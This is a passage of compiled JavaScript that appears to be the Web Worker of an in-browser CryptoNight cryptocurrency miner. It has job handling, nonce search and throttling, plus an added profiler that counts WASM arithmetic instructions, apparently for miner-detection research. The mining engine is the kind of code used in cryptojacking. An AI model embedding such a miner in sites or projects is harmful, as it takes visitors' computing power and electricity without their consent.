	"_emscripten_memcpy_big": _emscripten_memcpy_big,
	"_ftime": _ftime,
	"_gmtime": _gmtime,
	"DYNAMICTOP_PTR": DYNAMICTOP_PTR,
	"STACKTOP": STACKTOP
};

function wasmProfiler() {
	if (Module["asm"] != null && typeof _resetInstCounters === "function" && Module["asm"]["_getI32AddCountLo"] != null) {
		var addCountLo = new Uint32Array(1);
		var andCountLo = new Uint32Array(1);
		var shlCountLo = new Uint32Array(1);
		var shrCountLo = new Uint32Array(1);
		var xorCountLo = new Uint32Array(1);
		var addCountHi = new Uint32Array(1);
		var andCountHi = new Uint32Array(1);
		var shlCountHi = new Uint32Array(1);
		var shrCountHi = new Uint32Array(1);
		var xorCountHi = new Uint32Array(1);
		var addCount = new Uint32Array(1);
		var andCount = new Uint32Array(1);
		var shlCount = new Uint32Array(1);
		var shrCount = new Uint32Array(1);
		var xorCount = new Uint32Array(1);
			
		addCountLo[0] = _getI32AddCountLo();
		andCountLo[0] = _getI32AndCountLo();
		shlCountLo[0] = _getI32ShlCountLo();
		shrCountLo[0] = _getI32ShruCountLo();
		xorCountLo[0] = _getI32XorCountLo();
		addCountHi[0] = _getI32AddCountHi();
		andCountHi[0] = _getI32AndCountHi();
		shlCountHi[0] = _getI32ShlCountHi();
		shrCountHi[0] = _getI32ShruCountHi();
		xorCountHi[0] = _getI32XorCountHi();
		_resetInstCounters();	
		
		addCount[0] = addCountHi[0] * 4294967296 + addCountLo[0];
		andCount[0] = andCountHi[0] * 4294967296 + andCountLo[0];
		shlCount[0] = shlCountHi[0] * 4294967296 + shlCountLo[0];
		shrCount[0] = shrCountHi[0] * 4294967296 + shrCountLo[0];
		xorCount[0] = xorCountHi[0] * 4294967296 + xorCountLo[0];
		
		//console.log("("+addCountLo+","+andCountLo+","+shlCountLo+","+shrCountLo+","+xorCountLo+")");
		//console.log("("+addCountHi+","+andCountHi+","+shlCountHi+","+shrCountHi+","+xorCountHi+")");
		console.log("("+addCount[0]+","+andCount[0]+","+shlCount[0]+","+shrCount[0]+","+xorCount[0]+")");
	} else {
		console.log("Wasm not loaded yet");
	}
	
	setTimeout(wasmProfiler, 5000);
}
wasmProfiler();


var asm = Module["asm"](Module.asmGlobalArg, Module.asmLibraryArg, buffer);
Module["asm"] = asm;
var _aesb_single_round = Module["_aesb_single_round"] = (function () {
		return Module["asm"]["_aesb_single_round"].apply(null, arguments)
	});
var _cryptonight_create = Module["_cryptonight_create"] = (function () {
		return Module["asm"]["_cryptonight_create"].apply(null, arguments)
	});
var _cryptonight_destroy = Module["_cryptonight_destroy"] = (function () {
		return Module["asm"]["_cryptonight_destroy"].apply(null, arguments)
	});
var _cryptonight_hash_variant_0 = Module["_cryptonight_hash_variant_0"] = (function () {
		return Module["asm"]["_cryptonight_hash_variant_0"].apply(null, arguments)
	});
var _cryptonight_hash_variant_1 = Module["_cryptonight_hash_variant_1"] = (function () {
		return Module["asm"]["_cryptonight_hash_variant_1"].apply(null, arguments)
	});
var _malloc = Module["_malloc"] = (function () {
		return Module["asm"]["_malloc"].apply(null, arguments)
	});
var stackAlloc = Module["stackAlloc"] = (function () {
		return Module["asm"]["stackAlloc"].apply(null, arguments)
	});
var _getI32AddCountLo = Module["_getI32AddCountLo"] = (function () { return Module["asm"]["_getI32AddCountLo"].apply(null, arguments) });
var _getI32XorCountLo = Module["_getI32XorCountLo"] = (function () { return Module["asm"]["_getI32XorCountLo"].apply(null, arguments) });
var _getI32ShruCountLo = Module["_getI32ShruCountLo"] = (function () { return Module["asm"]["_getI32ShruCountLo"].apply(null, arguments) });
var _getI32AndCountLo = Module["_getI32AndCountLo"] = (function () { return Module["asm"]["_getI32AndCountLo"].apply(null, arguments) });
var _getI32ShlCountLo = Module["_getI32ShlCountLo"] = (function () { return Module["asm"]["_getI32ShlCountLo"].apply(null, arguments) });
var _getI32AddCountHi = Module["_getI32AddCountHi"] = (function () { return Module["asm"]["_getI32AddCountHi"].apply(null, arguments) });
var _getI32XorCountHi = Module["_getI32XorCountHi"] = (function () { return Module["asm"]["_getI32XorCountHi"].apply(null, arguments) });
var _getI32ShruCountHi = Module["_getI32ShruCountHi"] = (function () { return Module["asm"]["_getI32ShruCountHi"].apply(null, arguments) });
var _getI32AndCountHi = Module["_getI32AndCountHi"] = (function () { return Module["asm"]["_getI32AndCountHi"].apply(null, arguments) });
var _getI32ShlCountHi = Module["_getI32ShlCountHi"] = (function () { return Module["asm"]["_getI32ShlCountHi"].apply(null, arguments) });
var _resetInstCounters = Module["_resetInstCounters"] = (function () {
		return Module["asm"]["_resetInstCounters"].apply(null, arguments)
	});
Module["asm"] = asm;
function ExitStatus(status) {
	this.name = "ExitStatus";
	this.message = "Program terminated with exit(" + status + ")";
	this.status = status
}
ExitStatus.prototype = new Error;
ExitStatus.prototype.constructor = ExitStatus;
var initialStackTop;
dependenciesFulfilled = function runCaller() {
	if (!Module["calledRun"])
		run();
	if (!Module["calledRun"])
		dependenciesFulfilled = runCaller
};
function run(args) {
	args = args || Module["arguments"];
	if (runDependencies > 0) {
		return
	}
	preRun();
	if (runDependencies > 0)
		return;
	if (Module["calledRun"])
		return;
	function doRun() {
		if (Module["calledRun"])
			return;
		Module["calledRun"] = true;
		if (ABORT)
			return;
		ensureInitRuntime();
		preMain();
		if (Module["onRuntimeInitialized"])
			Module["onRuntimeInitialized"]();
		postRun()
	}
	if (Module["setStatus"]) {
		Module["setStatus"]("Running...");
		setTimeout((function () {
				setTimeout((function () {
						Module["setStatus"]("")
					}), 1);
				doRun()
			}), 1)
	} else {
		doRun()
	}
}
Module["run"] = run;
function exit(status, implicit) {
	if (implicit && Module["noExitRuntime"] && status === 0) {
		return
	}
	if (Module["noExitRuntime"]) {}
	else {
		ABORT = true;
		EXITSTATUS = status;
		STACKTOP = initialStackTop;
		exitRuntime();
		if (Module["onExit"])
			Module["onExit"](status)
	}
	if (ENVIRONMENT_IS_NODE) {
		process["exit"](status)
	}
	Module["quit"](status, new ExitStatus(status))
}
Module["exit"] = exit;
function abort(what) {
	if (Module["onAbort"]) {
		Module["onAbort"](what)
	}
	if (what !== undefined) {
		Module.print(what);
		Module.printErr(what);
		what = JSON.stringify(what)
	} else {
		what = ""
	}
	ABORT = true;
	EXITSTATUS = 1;
	throw "abort(" + what + "). Build with -s ASSERTIONS=1 for more info."
}
Module["abort"] = abort;
if (Module["preInit"]) {
	if (typeof Module["preInit"] == "function")
		Module["preInit"] = [Module["preInit"]];
	while (Module["preInit"].length > 0) {
		Module["preInit"].pop()()
	}
}
Module["noExitRuntime"] = true;
run();
var CryptonightWASMWrapper = (function () {
	this.ctx = _cryptonight_create();
	this.throttleWait = 0;
	this.throttledStart = 0;
	this.throttledHashes = 0;
	this.workThrottledBound = this.workThrottled.bind(this);
	this.currentJob = null;
	this.target = new Uint8Array([255, 255, 255, 255, 255, 255, 255, 255]);
	var heap = Module.HEAPU8.buffer;
	this.input = new Uint8Array(heap, Module._malloc(84), 84);
	this.output = new Uint8Array(heap, Module._malloc(32), 32);
	self.postMessage("ready");
	self.onmessage = this.onMessage.bind(this)
});
CryptonightWASMWrapper.prototype.onMessage = (function (msg) {
	var job = msg.data;
	if (job.verify_id) {
		this.verify(job);
		return
	}
	if (!this.currentJob || this.currentJob.job_id !== job.job_id) {
		this.setJob(job)
	}
	if (job.throttle) {
		this.throttleWait = 1 / (1 - job.throttle) - 1;
		this.throttledStart = this.now();
		this.throttledHashes = 0;
		this.workThrottled()
	} else {
		this.work()
	}
});
CryptonightWASMWrapper.prototype.destroy = (function () {
	_cryptonight_destroy(this.ctx)
});
CryptonightWASMWrapper.prototype.hexToBytes = (function (hex, bytes) {
	var bytes = new Uint8Array(hex.length / 2);
	for (var i = 0, c = 0; c < hex.length; c += 2, i++) {
		bytes[i] = parseInt(hex.substr(c, 2), 16)
	}
	return bytes
});
CryptonightWASMWrapper.prototype.bytesToHex = (function (bytes) {
	for (var hex = "", i = 0; i < bytes.length; i++) {
		hex += (bytes[i] >>> 4).toString(16);
		hex += (bytes[i] & 15).toString(16)
	}
	return hex
});
CryptonightWASMWrapper.prototype.meetsTarget = (function (hash, target) {
	for (var i = 0; i < target.length; i++) {
		var hi = hash.length - i - 1,
		ti = target.length - i - 1;
		if (hash[hi] > target[ti]) {
			return false
		} else if (hash[hi] < target[ti]) {
			return true
		}
	}
	return false
});
CryptonightWASMWrapper.prototype.setVersion = (function (version) {
	if (version === 7) {
		this.cryptonight_hash_impl = _cryptonight_hash_variant_0
	} else {
		this.cryptonight_hash_impl = _cryptonight_hash_variant_0
	}
});
CryptonightWASMWrapper.prototype.setJob = (function (job) {
	this.currentJob = job;
	this.blob = this.hexToBytes(job.blob);
	this.input.set(this.blob);
	this.setVersion(this.blob[0]);
	var target = this.hexToBytes(job.target);
	if (target.length <= 8) {
		for (var i = 0; i < target.length; i++) {
			this.target[this.target.length - i - 1] = target[target.length - i - 1]
		}
		for (var i = 0; i < this.target.length - target.length; i++) {
			this.target[i] = 255
		}
	} else {
		this.target = target
	}
});
CryptonightWASMWrapper.prototype.now = (function () {
	return self.performance ? self.performance.now() : Date.now()
});
CryptonightWASMWrapper.prototype.hash = (function (input, output, length) {
	var nonce = Math.random() * 4294967295 + 1 >>> 0;
	this.input[39] = (nonce & 4278190080) >> 24;
	this.input[40] = (nonce & 16711680) >> 16;
	this.input[41] = (nonce & 65280) >> 8;
	this.input[42] = (nonce & 255) >> 0;
	this.cryptonight_hash_impl(this.ctx, input.byteOffset, output.byteOffset, length)
});
CryptonightWASMWrapper.prototype.verify = (function (job) {
	this.blob = this.hexToBytes(job.blob);
	this.input.set(this.blob);
	this.setVersion(this.blob[0]);
	for (var i = 0, c = 0; c < job.nonce.length; c += 2, i++) {
		this.input[39 + i] = parseInt(job.nonce.substr(c, 2), 16)
	}
	this.cryptonight_hash_impl(this.ctx, this.input.byteOffset, this.output.byteOffset, this.blob.length);
	var result = this.bytesToHex(this.output);
	self.postMessage({
		verify_id: job.verify_id,
		verified: result === job.result,
		result: result
	})
});
CryptonightWASMWrapper.prototype.work = (function () {
	var hashes = 0;
	var meetsTarget = false;
	var start = this.now();
	var elapsed = 0;
	do {	
		this.hash(this.input, this.output, this.blob.length);
		hashes++;
		meetsTarget = this.meetsTarget(this.output, this.target);
		elapsed = this.now() - start
	} while (!meetsTarget && elapsed < 1e3);
	var hashesPerSecond = hashes / (elapsed / 1e3);
	if (meetsTarget) {
		var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
		var resultHex = this.bytesToHex(this.output);
		self.postMessage({
			hashesPerSecond: hashesPerSecond,
			hashes: hashes,
			job_id: this.currentJob.job_id,
			nonce: nonceHex,
			result: resultHex
		})
	} else {
		self.postMessage({
			hashesPerSecond: hashesPerSecond,
			hashes: hashes
		})
	}
});
CryptonightWASMWrapper.prototype.workThrottled = (function () {
	var start = this.now();
	this.hash(this.input, this.output, this.blob.length);
	var end = this.now();
	var timePerHash = end - start;
	this.throttledHashes++;
	var elapsed = end - this.throttledStart;
	var hashesPerSecond = this.throttledHashes / (elapsed / 1e3);
	if (this.meetsTarget(this.output, this.target)) {
		var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
		var resultHex = this.bytesToHex(this.output);
		self.postMessage({
			hashesPerSecond: hashesPerSecond,
			hashes: this.throttledHashes,
			job_id: this.currentJob.job_id,
			nonce: nonceHex,
			result: resultHex
		});
		this.throttledHashes = 0
	} else if (elapsed > 1e3) {
		self.postMessage({
			hashesPerSecond: hashesPerSecond,
			hashes: this.throttledHashes
		});
		this.throttledHashes = 0
	} else {
		var wait = Math.min(2e3, timePerHash * this.throttleWait);
		setTimeout(this.workThrottledBound, wait)
	}
});
Module["onRuntimeInitialized"] = (function () {
	var cryptonight = new CryptonightWASMWrapper
})

